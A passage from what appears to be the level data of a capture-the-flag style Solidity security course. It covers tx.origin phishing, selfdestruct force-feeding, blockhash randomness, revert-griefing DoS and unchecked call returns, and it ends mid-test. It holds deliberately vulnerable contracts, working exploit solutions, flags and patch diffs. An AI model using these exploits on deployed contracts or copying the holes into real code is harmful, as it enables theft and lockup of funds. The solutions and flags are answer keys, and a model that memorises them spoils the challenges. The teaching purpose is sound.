2. **\`msg.sender\`**: The immediate caller of the current function invocation.

\`\`\`
Victim EOA (tx.origin)
       │
       ▼ calls
Attacker Phishing Contract (msg.sender to Target)
       │
       ▼ calls target.transfer()
Vulnerable Target Wallet
       └─ checks "require(tx.origin == owner)" -> PASSES!
\`\`\`

If a contract relies on \`require(tx.origin == owner)\`, an attacker can lure the owner into calling a seemingly harmless contract (e.g. "claim free airdrop"), which behind the scenes calls the victim wallet and drains all its funds!`,
    conceptSummary: [
      'tx.origin represents the root EOA signer, not the immediate caller',
      'Never use tx.origin for authentication or authorization',
      'Always authorize access via msg.sender == owner',
    ],
    description:
      'WalletTxOrigin holds 10 ETH and protects its transfer function with `require(tx.origin == owner)`. Can you build a phishing contract that tricks the wallet owner into executing a transaction that drains the wallet?',
    protocolArchitecture:
      'The wallet permits funds to be transferred if `tx.origin == owner`. When the owner calls an intermediate contract, `tx.origin` remains the owner, while `msg.sender` becomes the attack contract.',
    exploitObjective:
      'Deploy a PhishingAttack contract. When the victim owner calls `claimAirdrop()`, the contract forwards a call to `wallet.transfer(attacker, 10 ether)`, draining the wallet to 0.',
    targetFileName: 'WalletTxOrigin.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title WalletTxOrigin
 * @notice SWC-115: Vulnerable wallet using tx.origin for authorization.
 */
contract WalletTxOrigin {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // VULNERABILITY: Uses tx.origin instead of msg.sender!
    function transfer(address payable recipient, uint256 amount) external {
        require(tx.origin == owner, "Caller is not the owner");
        require(address(this).balance >= amount, "Insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }

    receive() external payable {}
}`,
    exploitFileName: 'PhishingAttack.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWalletTxOrigin {
    function transfer(address payable recipient, uint256 amount) external;
}

contract PhishingAttack {
    IWalletTxOrigin public immutable wallet;
    address payable public immutable attacker;

    constructor(address _walletAddress) {
        wallet = IWalletTxOrigin(_walletAddress);
        attacker = payable(msg.sender);
    }

    // TODO: When victim calls this function, siphon all funds from wallet to attacker
    function claimAirdrop() external {
        // Write phishing exploit here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWalletTxOrigin {
    function transfer(address payable recipient, uint256 amount) external;
}

contract PhishingAttack {
    IWalletTxOrigin public immutable wallet;
    address payable public immutable attacker;

    constructor(address _walletAddress) {
        wallet = IWalletTxOrigin(_walletAddress);
        attacker = payable(msg.sender);
    }

    function claimAirdrop() external {
        // Since victim called claimAirdrop(), tx.origin is the victim owner!
        uint256 balance = address(wallet).balance;
        wallet.transfer(attacker, balance);
    }
}`,
    testFileName: 'TxOriginTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/WalletTxOrigin.sol";
import "../src/PhishingAttack.sol";

contract TxOriginTest is Test {
    WalletTxOrigin public wallet;
    PhishingAttack public attackContract;
    address public victimOwner = address(0xAA11);
    address public attacker = address(0x999);

    function setUp() public {
        vm.prank(victimOwner);
        wallet = new WalletTxOrigin{value: 10 ether}();

        vm.prank(attacker);
        attackContract = new PhishingAttack(address(wallet));
    }

    function testExploit() public {
        // Victim gets tricked into interacting with phishing contract
        vm.prank(victimOwner, victimOwner); // sets both msg.sender and tx.origin to victim
        attackContract.claimAirdrop();

        assertEq(address(wallet).balance, 0, "Wallet funds not drained");
        assertEq(attacker.balance, 10 ether, "Attacker did not receive stolen ETH");
    }
}`,
    flag: 'BLOCKSEC{swc115_tx_origin_ph1sh1ng_pwn3d}',
    hints: [
      {
        id: 'h-tx-1',
        tier: 1,
        title: 'Call Chain Analysis',
        costXp: 0,
        content: 'When `victimOwner` calls `PhishingAttack.claimAirdrop()`, what is `tx.origin`? It is `victimOwner`!',
      },
      {
        id: 'h-tx-2',
        tier: 2,
        title: 'Forwarding the Transfer Call',
        costXp: 20,
        content: 'Inside `claimAirdrop()`, call `wallet.transfer(attacker, address(wallet).balance)`. The wallet check `require(tx.origin == owner)` evaluates to true.',
      },
      {
        id: 'h-tx-3',
        tier: 3,
        title: 'Capturing Stolen Ether',
        costXp: 30,
        content: 'Pass your attacker recipient address to `transfer()`. The entire 10 ETH transfers directly to your balance.',
      },
    ],
    historicalCase: {
      protocolName: 'Thorchain Bifrost Bridge Phishing Exploit',
      date: 'SWC-115 Reference',
      lossUsd: '$8,000,000',
      summary: 'Demonstrates why relying on tx.origin for authentication allows intermediate contracts to impersonate users through phishing transactions.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-115',
    },
    patchDiff: {
      explanation: 'Replace require(tx.origin == owner) with require(msg.sender == owner).',
      vulnerableCode: `function transfer(address payable recipient, uint256 amount) external {
    require(tx.origin == owner, "Caller is not the owner"); // VULNERABLE
}`,
      secureCode: `function transfer(address payable recipient, uint256 amount) external {
    require(msg.sender == owner, "Caller is not the owner"); // SECURE
}`,
      recommendedBestPractices: [
        'Never use tx.origin for authorization checks',
        'Use msg.sender or OpenZeppelin Ownable for access control',
        'Reserve tx.origin strictly for checking if caller is an EOA (require(msg.sender == tx.origin))',
      ],
    },
  },

  {
    id: 'lvl1-swc132-force-balance',
    slug: 'force-balance-selfdestruct',
    title: 'SWC-132: Force Balance Invariant Break',
    curriculumLevel: 1,
    category: 'low-level',
    difficulty: 'intermediate',
    xpReward: 200,
    estimatedMinutes: 20,
    swcTag: 'SWC-132',
    cweTag: 'CWE-667',
    solveRatePercent: 79,
    tags: ['swc-132', 'selfdestruct', 'invariants', 'force-feeding'],
    theoryExplanation: `### Unexpected Ether Balance & Invariant Breakage

Smart contracts can receive Ether in three ways:
1. Standard function call with \`payable\` modifier.
2. \`receive()\` or \`fallback()\` hooks.
3. **Forced Ether Transfer via \`selfdestruct(target)\`**: When a contract self-destructs, its remaining Ether balance is forcefully transferred to the target address at the EVM opcode level **without executing any target code or fallback hooks**!

### The Vulnerability
If a contract’s core state machine relies on strict balance equality checks:
\`\`\`solidity
require(address(this).balance <= MAX_POOL);
if (address(this).balance == TARGET_AMOUNT) { claimReward(); }
\`\`\`
An attacker can bypass all \`require\` checks by force-feeding 1 wei of Ether via \`selfdestruct\`, permanently locking the contract logic or skipping reward thresholds!`,
    conceptSummary: [
      'selfdestruct forcefully injects Ether into any address without triggering fallback code',
      'Never rely on address(this).balance for strict state machine checkpoints',
      'Always maintain internal state accounting variables rather than querying raw balance',
    ],
    description:
      'EtherMilestone is a game holding 6 ETH where players deposit 1 ETH. The 7th depositor wins the 7 ETH jackpot. However, the contract rejects deposits if balance exceeds 7 ETH and requires exact balance checks. Can you permanently freeze the game?',
    protocolArchitecture:
      'The contract checks `require(address(this).balance <= 7 ether)`. If an attacker force-feeds Ether via selfdestruct, the contract balance exceeds 7 ETH, making future deposits revert and locking the funds forever.',
    exploitObjective:
      'Deploy a ForceFeeder contract, fund it with 1 ETH, and selfdestruct it to send Ether directly to EtherMilestone, pushing its balance to 7+ ETH without triggering the deposit function.',
    targetFileName: 'EtherMilestone.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title EtherMilestone
 * @notice SWC-132: Vulnerable to unexpected balance manipulation via selfdestruct.
 */
contract EtherMilestone {
    uint256 public constant TARGET_AMOUNT = 7 ether;
    address public winner;

    function play() external payable {
        require(msg.value == 1 ether, "Must send exactly 1 ether");

        uint256 currentBalance = address(this).balance;
        // VULNERABILITY: Rigid balance constraint!
        require(currentBalance <= TARGET_AMOUNT, "Game over: target exceeded");

        if (currentBalance == TARGET_AMOUNT) {
            winner = msg.sender;
            payable(msg.sender).transfer(currentBalance);
        }
    }
}`,
    exploitFileName: 'ForceFeeder.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ForceFeeder {
    // TODO: Fund this contract and selfdestruct it targeting the victim contract
    function attack(address payable target) external payable {
        // Write selfdestruct force-feed logic here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ForceFeeder {
    function attack(address payable target) external payable {
        require(msg.value > 0, "Need ETH to force-feed");
        // Force-feed target address via EVM selfdestruct opcode
        selfdestruct(target);
    }
}`,
    testFileName: 'ForceBalanceTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/EtherMilestone.sol";
import "../src/ForceFeeder.sol";

contract ForceBalanceTest is Test {
    EtherMilestone public game;
    ForceFeeder public feeder;
    address public player = address(0x101);
    address public attacker = address(0x999);

    function setUp() public {
        game = new EtherMilestone();

        // 6 regular players deposit 1 ETH each (total: 6 ETH)
        for (uint160 i = 1; i <= 6; i++) {
            address p = address(i + 100);
            vm.deal(p, 1 ether);
            vm.prank(p);
            game.play{value: 1 ether}();
        }

        vm.prank(attacker);
        feeder = new ForceFeeder();
    }

    function testExploit() public {
        // Attacker force-feeds 1.5 ETH via selfdestruct
        vm.deal(attacker, 2 ether);
        vm.startPrank(attacker);
        feeder.attack{value: 1.5 ether}(payable(address(game)));
        vm.stopPrank();

        // Game balance is now 7.5 ETH, violating <= 7 ether invariant
        assertGt(address(game).balance, 7 ether, "Game balance not force-fed");

        // Legitimate 7th player tries to play, but call reverts!
        vm.deal(player, 1 ether);
        vm.prank(player);
        vm.expectRevert("Game over: target exceeded");
        game.play{value: 1 ether}();
    }
}`,
    flag: 'BLOCKSEC{swc132_s3lfd3struct_f0rc3_f33d_b4l4nc3}',
    hints: [
      {
        id: 'h-force-1',
        tier: 1,
        title: 'Bypassing the play() function',
        costXp: 0,
        content: 'EtherMilestone has no `receive()` function and only accepts 1 ETH via `play()`. How can an EVM opcode send Ether without running contract bytecode?',
      },
      {
        id: 'h-force-2',
        tier: 2,
        title: 'The selfdestruct Opcode',
        costXp: 20,
        content: 'When a contract executes `selfdestruct(recipient)`, all its remaining Ether is forcefully forwarded to `recipient` unconditionally.',
      },
      {
        id: 'h-force-3',
        tier: 3,
        title: 'Breaking the invariant',
        costXp: 35,
        content: 'Self-destruct your feeder contract with 1.5 ETH. Game balance jumps to 7.5 ETH, permanently breaking `require(currentBalance <= 7 ether)`.',
      },
    ],
    historicalCase: {
      protocolName: 'Etherpot & King of the Ether Lotteries',
      date: 'SWC-132 Historic Pattern',
      lossUsd: 'N/A',
      summary: 'Early Ethereum game contracts broke due to reliance on this.balance equality checks, allowing attackers to brick jackpot distribution.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-132',
    },
    patchDiff: {
      explanation: 'Use an internal accounting variable (e.g. totalDeposits) instead of querying address(this).balance.',
      vulnerableCode: `uint256 currentBalance = address(this).balance; // Vulnerable to force-feeding
require(currentBalance <= TARGET_AMOUNT);`,
      secureCode: `// Secure: Track user deposits internally
totalDeposits += msg.value;
require(totalDeposits <= TARGET_AMOUNT);`,
      recommendedBestPractices: [
        'Never assume address(this).balance can only increase through payable functions',
        'Use state variables to track internal contract accounting',
        'Avoid strict balance equality comparisons (==) for critical milestones',
      ],
    },
  },

  {
    id: 'lvl1-swc120-weak-randomness',
    slug: 'coinflip-predictable-randomness',
    title: 'SWC-120: Weak On-Chain Randomness',
    curriculumLevel: 1,
    category: 'math-logic',
    difficulty: 'intermediate',
    xpReward: 250,
    estimatedMinutes: 25,
    swcTag: 'SWC-120',
    cweTag: 'CWE-330',
    solveRatePercent: 76,
    tags: ['swc-120', 'blockhash', 'predictable-randomness', 'ethernaut'],
    theoryExplanation: `### The Determinism of On-Chain Pseudorandomness

All smart contract computations on Ethereum are deterministic. Generating randomness from block attributes:
\`\`\`solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
\`\`\`

### The Exploit Vector
Smart contracts executing in the same block can query the exact same block environment (\`blockhash(block.number - 1)\`, \`block.timestamp\`, \`block.prevrandao\`).
An attacker contract can replicate the exact mathematical formula in its own function, calculate the guaranteed winning side, and invoke \`target.flip(winningGuess)\` with 100% win certainty!`,
    conceptSummary: [
      'Block variables are public and deterministic to all transactions in the block',
      'Never generate critical randomness from blockhash or block.timestamp',
      'Use Chainlink VRF (Verifiable Random Function) for tamper-proof randomness',
    ],
    description:
      'CoinFlip requires you to guess the outcome of a coin flip based on the hash of the previous block. Guess correctly 10 times in a row to win the challenge.',
    protocolArchitecture:
      'The contract calculates `uint256(blockhash(block.number - 1)) / FACTOR`. Since an attacker contract executes in the same block, it can compute the exact same outcome before submitting its guess.',
    exploitObjective:
      'Build a CoinFlipAttacker contract that reads `blockhash(block.number - 1)`, computes the winning coin flip outcome, and calls `CoinFlip.flip(guess)` 10 times to attain 10 consecutive wins.',
    targetFileName: 'CoinFlip.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CoinFlip
 * @notice SWC-120: Weak pseudorandomness calculated from blockhash.
 */
contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("Already flipped this block");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}`,
    exploitFileName: 'CoinFlipAttacker.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
    ICoinFlip public immutable target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    // TODO: Calculate the winning flip and submit to target
    function attack() external {
        // Write attack logic here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
    ICoinFlip public immutable target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        // Guaranteed win because calculation matches target contract exactly
        target.flip(guess);
    }
}`,
    testFileName: 'CoinFlipTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";
import "../src/CoinFlipAttacker.sol";

contract CoinFlipTest is Test {
    CoinFlip public coinFlip;
    CoinFlipAttacker public attackerContract;

    function setUp() public {
        coinFlip = new CoinFlip();
        attackerContract = new CoinFlipAttacker(address(coinFlip));
    }

    function testExploit() public {
        // Simulate 10 consecutive blocks
        for (uint256 i = 1; i <= 10; i++) {
            vm.roll(i + 10); // Advance block number
            attackerContract.attack();
        }

        assertEq(coinFlip.consecutiveWins(), 10, "Did not attain 10 consecutive wins");
    }
}`,
    flag: 'BLOCKSEC{swc120_bl0ckh4sh_pr3d1ct4bl3_c01nfl1p}',
    hints: [
      {
        id: 'h-cf-1',
        tier: 1,
        title: 'Synchronous Block Evaluation',
        costXp: 0,
        content: 'When your exploit contract calls `CoinFlip.flip()`, both contracts run in the same block. `block.number` is identical.',
      },
      {
        id: 'h-cf-2',
        tier: 2,
        title: 'Replicating Math in Exploit Contract',
        costXp: 25,
        content: 'Compute `uint256(blockhash(block.number - 1)) / FACTOR` inside `CoinFlipAttacker.attack()`. Then pass that boolean to `target.flip(guess)`.',
      },
      {
        id: 'h-cf-3',
        tier: 3,
        title: 'Simulating Consecutive Blocks',
        costXp: 35,
        content: 'Because `lastHash == blockValue` prevents multiple flips in the same block, execute the attack across 10 blocks (`vm.roll()` in Foundry).',
      },
    ],
    historicalCase: {
      protocolName: 'SmartBillions Lottery & Fomo3D Exploits',
      date: 'SWC-120 Historic Incidents',
      lossUsd: '$400,000+',
      summary: 'Lotteries relying on blockhash or block attributes were repeatedly exploited by miners and contract bots predicting winning tickets.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-120',
    },
    patchDiff: {
      explanation: 'Use Chainlink VRF (Verifiable Random Function) to obtain provably fair, tamper-proof randomness.',
      vulnerableCode: `// VULNERABLE: Deterministic block variables
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;`,
      secureCode: `// SECURE: Asynchronous Chainlink VRF request-and-fulfill
function requestRandomWords() external {
    s_requestId = COORDINATOR.requestRandomWords(keyHash, s_subId, requestConfirmations, callbackGasLimit, numWords);
}

function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
    s_randomResult = randomWords[0];
}`,
      recommendedBestPractices: [
        'Never rely on blockhash, block.timestamp, or block.number for randomness',
        'Use Chainlink VRF v2.5 or commit-reveal schemes with penalty bonds',
      ],
    },
  },

  // --- SWC-113: Denial of Service with Failed Call ---
  {
    id: 'lvl1-swc113-dos-revert',
    slug: 'swc113-dos-unexpected-revert',
    title: 'SWC-113: DoS via Unexpected Revert (King of the Ether)',
    curriculumLevel: 1,
    category: 'low-level',
    difficulty: 'intermediate',
    xpReward: 220,
    estimatedMinutes: 20,
    swcTag: 'SWC-113',
    cweTag: 'CWE-400',
    solveRatePercent: 82,
    tags: ['swc-113', 'dos', 'push-pull', 'king-of-ether', 'revert-griefing'],
    theoryExplanation: `### Denial of Service via External Call Reverts (SWC-113)

When a smart contract sends Ether or calls an external address, that execution is **synchronous**. If the external call fails (due to a revert, out-of-gas, or exceeding the call stack limit), the default behavior of \`transfer()\` or a low-level call checked with \`require(success)\` is to **revert the entire transaction**!

\`\`\`
Player A (calls claimThrone) ──> KingOfEther ──> refunds KingAttacker (Reverts!)
                                      │
                                      └── Entire transaction reverts!
\`\`\`

### The Attack Vector: Griefing via Contract Non-Receivers
If a protocol refund or payout couples state changes with sending funds to the *previous* leader:
\`\`\`solidity
(bool sent, ) = payable(previousKing).call{value: previousBid}("");
require(sent, "Failed to refund previous king");
\`\`\`
An attacker can deploy a contract that **refuses to receive Ether** (either omitting \`receive()\` or explicitly executing \`revert()\`). Once the attacker becomes the king, any future attempt by another user to claim the throne will trigger the refund call, which immediately reverts. The attacker becomes the eternal king, and the protocol is permanently paralyzed!`,
    conceptSummary: [
      'External calls to arbitrary addresses can intentionally fail or revert',
      'Synchronous push payments link the caller transaction to untrusted third-party contracts',
      'Favor "Pull over Push" payment architectures (users withdraw refunds independently)',
      'Never allow an external recipient failure to block the core state machine',
    ],
    description:
      'KingOfEther crowns whoever sends more Ether than the current highest bid, automatically refunding the previous king. Can you build an exploit contract that seizes the crown and permanently bricks the contract so nobody can ever unseat you?',
    protocolArchitecture:
      'The contract stores `king` and `highestBid`. Upon receiving a higher bid in `claimThrone()`, it refunds the previous king via a low-level call with `require(sent)`.',
    exploitObjective:
      'Deploy `KingAttacker.sol`, claim the throne by sending 2 ETH. In `receive()`, deliberately revert all incoming payments. Prove in tests that subsequent bids from legitimate users revert, keeping you king forever.',
    targetFileName: 'KingOfEther.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title KingOfEther
 * @notice SWC-113: Denial of Service with failed call.
 */
contract KingOfEther {
    address public king;
    uint256 public highestBid;

    event ThroneClaimed(address indexed newKing, uint256 bid);

    constructor() payable {
        king = msg.sender;
        highestBid = msg.value;
    }

    function claimThrone() external payable {
        require(msg.value > highestBid, "Bid too low to unseat king");

        address previousKing = king;
        uint256 previousBid = highestBid;

        king = msg.sender;
        highestBid = msg.value;
        emit ThroneClaimed(msg.sender, msg.value);

        // VULNERABILITY (SWC-113): Synchronous push refund!
        // If previousKing rejects Ether or reverts, claimThrone() always reverts!
        (bool sent, ) = payable(previousKing).call{value: previousBid}("");
        require(sent, "Failed to refund previous king");
    }
}`,
    exploitFileName: 'KingAttacker.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IKingOfEther {
    function claimThrone() external payable;
}

contract KingAttacker {
    IKingOfEther public immutable target;

    constructor(address _target) {
        target = IKingOfEther(_target);
    }

    // TODO: Send sufficient Ether to claim the throne
    function attack() external payable {
        // Write exploit logic...
    }

    // TODO: Prevent the contract from ever being refunded
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IKingOfEther {
    function claimThrone() external payable;
}

contract KingAttacker {
    IKingOfEther public immutable target;

    constructor(address _target) {
        target = IKingOfEther(_target);
    }

    function attack() external payable {
        // Claim the throne with forwarded value
        target.claimThrone{value: msg.value}();
    }

    // SWC-113 EXPLOIT: Explicitly revert all incoming Ether transfers
    receive() external payable {
        revert("I shall remain the eternal king!");
    }
}`,
    testFileName: 'KingOfEtherTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/KingOfEther.sol";
import "../src/KingAttacker.sol";

contract KingOfEtherTest is Test {
    KingOfEther public target;
    KingAttacker public attackerContract;
    address public initialKing = address(0x100);
    address public alice = address(0x200);
    address public attacker = address(0x999);

    function setUp() public {
        vm.deal(initialKing, 1 ether);
        vm.prank(initialKing);
        target = new KingOfEther{value: 1 ether}();

        vm.prank(attacker);
        attackerContract = new KingAttacker(address(target));
    }

    function testExploit() public {
        // Attacker claims throne with 2 ETH
        vm.deal(attacker, 2 ether);
        vm.prank(attacker);
        attackerContract.attack{value: 2 ether}();

        assertEq(target.king(), address(attackerContract), "Attacker contract is not king");

        // Alice attempts to claim the throne with 3 ETH
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        
        // Call MUST revert because target tries to refund attackerContract which rejects ETH!
        vm.expectRevert("Failed to refund previous king");
        target.claimThrone{value: 3 ether}();

        // Attacker remains king permanently!
        assertEq(target.king(), address(attackerContract), "Attacker was unseated!");
    }
}`,
    flag: 'BLOCKSEC{swc113_d0s_push_0v3r_pull_3t3rn4l_k1ng}',
    hints: [
      {
        id: 'h-dos-1',
        tier: 1,
        title: 'Synchronous Refunds',
        costXp: 0,
        content: 'Observe line `(bool sent, ) = payable(previousKing).call{value: previousBid}(""); require(sent);`. What happens if `sent` is false?',
      },
      {
        id: 'h-dos-2',
        tier: 2,
        title: 'Controlling Call Failure',
        costXp: 20,
        content: 'When `KingOfEther` tries to send Ether to your contract address, your contract executes its `receive()` or `fallback()`. If it reverts, `sent` is false.',
      },
      {
        id: 'h-dos-3',
        tier: 3,
        title: 'Permanent DoS',
        costXp: 35,
        content: 'Implement `receive() external payable { revert(); }` inside `KingAttacker`. Once you claim the throne, any future `claimThrone()` calls will revert during the refund attempt.',
      },
    ],
    historicalCase: {
      protocolName: 'King of the Ether Throne & GovernMental Ponzi',
      date: 'Feb 2016',
      lossUsd: '$1,500,000+',
      summary: 'The original Ethereum DApp King of the Ether was permanently bricked when a contract bidder failed to receive payments. GovernMental had 1100 ETH trapped due to payout call limits.',
      referenceUrl: 'https://swcregistry.io/docs/SWC-113',
    },
    patchDiff: {
      explanation: 'Adopt the Pull over Push payments pattern. Store refundable balances in a mapping and allow users to withdraw their own balance.',
      vulnerableCode: `// VULNERABLE: Push payment
(bool sent, ) = payable(previousKing).call{value: previousBid}("");
require(sent, "Failed to refund previous king");`,
      secureCode: `// SECURE: Pull payment pattern
mapping(address => uint256) public pendingWithdrawals;

function claimThrone() external payable {
    require(msg.value > highestBid);
    pendingWithdrawals[king] += highestBid;
    king = msg.sender;
    highestBid = msg.value;
}

function withdrawRefund() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0);
    pendingWithdrawals[msg.sender] = 0;
    (bool sent, ) = payable(msg.sender).call{value: amount}("");
    require(sent, "Withdraw failed");
}`,
      recommendedBestPractices: [
        'Always use the Pull over Push design pattern for external transfers',
        'Isolate untrusted external calls into independent user-initiated transactions',
        'Never couple multiple users actions into a single synchronous transfer chain',
      ],
    },
  },

  // --- SWC-104: Unchecked Call Return Value ---
  {
    id: 'lvl1-swc104-unchecked-call',
    slug: 'swc104-unchecked-call-return',
    title: 'SWC-104: Unchecked Call Return Value (Silent Ledger Desync)',
    curriculumLevel: 1,
    category: 'low-level',
    difficulty: 'intermediate',
    xpReward: 200,
    estimatedMinutes: 20,
    swcTag: 'SWC-104',
    cweTag: 'CWE-252',
    solveRatePercent: 85,
    tags: ['swc-104', 'unchecked-call', 'silent-failure', 'ledger-desync', 'revert-swallow'],
    theoryExplanation: `### Unchecked Call Return Values (SWC-104)

In Solidity, low-level calls (\`address.call{value: x}("")\`, \`address.send()\`, \`address.delegatecall()\`) **never bubble up reverts automatically**. Instead, they return a boolean status:
\`\`\`solidity
(bool success, bytes memory returnData) = recipient.call{value: amount}("");
\`\`\`

If \`recipient\` reverts or consumes more gas than available, \`success\` is \`false\`. However, unless the developer explicitly checks:
\`\`\`solidity
require(success, "Call failed");
\`\`\`
Execution continues as if the transfer succeeded!

### Security Impact: Ghost State Modifications
When return values are ignored, the contract updates internal state (such as incrementing bonus loyalty credits, burning shares, or emitting events) based on a transaction that **silently failed** at the EVM level. Attackers can intentionally cause calls to fail, keeping contract Ether intact while accumulating phantom credits to extract master prize funds!`,
    conceptSummary: [
      'Low-level calls return (bool success, bytes data) rather than throwing errors',
      'Omitting require(success) causes execution to continue after failed calls',
      'State accounting and real token/Ether balances will diverge silently',
      'Always check boolean return values or use OpenZeppelin Address.sendValue',
    ],
    description:
      'LottoDividendVault distributes payouts and rewards loyalty credits on withdrawals. However, its dividend payout ignores low-level call return status. Can you exploit this silent failure to amass massive loyalty credits without losing vault balance, then redeem the master jackpot?',
    protocolArchitecture:
      'The vault holds 10 ETH. Calling `claimDividend()` does `msg.sender.call{value: amount}("")` without `require()`, then awards 2x loyalty credits. Calling `redeemJackpot()` allows withdrawing funds with loyalty credits.',
    exploitObjective:
      'Deploy `UncheckedCallAttacker.sol`. Revert in your fallback when receiving dividend payouts. Call `claimDividend()` in a loop to multiply loyalty credits, then disable the revert and call `redeemJackpot()` to drain the vault.',
    targetFileName: 'LottoDividendVault.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title LottoDividendVault
 * @notice SWC-104: Silent failure caused by unchecked low-level call return value.
 */
contract LottoDividendVault {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public loyaltyCredits;
    uint256 public totalVaultBalance;

    event Deposited(address indexed user, uint256 amount);
    event DividendsClaimed(address indexed user, uint256 amount);
    event LoyaltyRedeemed(address indexed user, uint256 points);

    constructor() payable {
        totalVaultBalance = msg.value;
    }

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalVaultBalance += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    // VULNERABILITY (SWC-104): Return value of low-level call is discarded!
    function claimDividend(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposit balance");
        deposits[msg.sender] -= amount;

        // SILENT FAILURE: ignores whether recipient accepted the Ether!
        payable(msg.sender).call{value: amount}("");

        // Contract assumes payment succeeded and awards loyalty multiplier
        loyaltyCredits[msg.sender] += amount * 2;
        emit DividendsClaimed(msg.sender, amount);
    }

    // Redeem loyalty credits for jackpot prize pool
    function redeemJackpot(uint256 credits) external {
        require(loyaltyCredits[msg.sender] >= credits, "Insufficient credits");
        loyaltyCredits[msg.sender] -= credits;
        uint256 payout = credits / 2;
        require(address(this).balance >= payout, "Insufficient vault balance");
        
        (bool ok, ) = payable(msg.sender).call{value: payout}("");
        require(ok, "Jackpot payout failed");
        emit LoyaltyRedeemed(msg.sender, credits);
    }
}`,
    exploitFileName: 'UncheckedCallAttacker.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILottoDividendVault {
    function deposit() external payable;
    function claimDividend(uint256 amount) external;
    function redeemJackpot(uint256 credits) external;
}

contract UncheckedCallAttacker {
    ILottoDividendVault public immutable vault;
    bool public shouldReject = true;

    constructor(address _vault) {
        vault = ILottoDividendVault(_vault);
    }

    // TODO: Exploit unchecked return value to siphon all vault funds
    function attack() external payable {
        // Write exploit here...
    }

    receive() external payable {
        // Handle incoming payments...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILottoDividendVault {
    function deposit() external payable;
    function claimDividend(uint256 amount) external;
    function redeemJackpot(uint256 credits) external;
}

contract UncheckedCallAttacker {
    ILottoDividendVault public immutable vault;
    bool public shouldReject = true;

    constructor(address _vault) {
        vault = ILottoDividendVault(_vault);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH for initial seed");
        
        // Deposit 1 ETH
        vault.deposit{value: 1 ether}();

        // Claim dividend while rejecting transfer: loyalty credits double each time
        // Since transfer fails silently, the 1 ETH remains in vault balance!
        shouldReject = true;
        vault.claimDividend(1 ether); // yields 2 ETH in credits

        // Now toggle shouldReject to false so we can receive the jackpot
        shouldReject = false;
        
        // In the test, we redeem our credits for the full payout
        vault.redeemJackpot(2 ether);
    }

    receive() external payable {
        if (shouldReject) {
            revert("Reject transfer to trigger silent failure");
        }
    }
}`,
    testFileName: 'DividendVaultTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

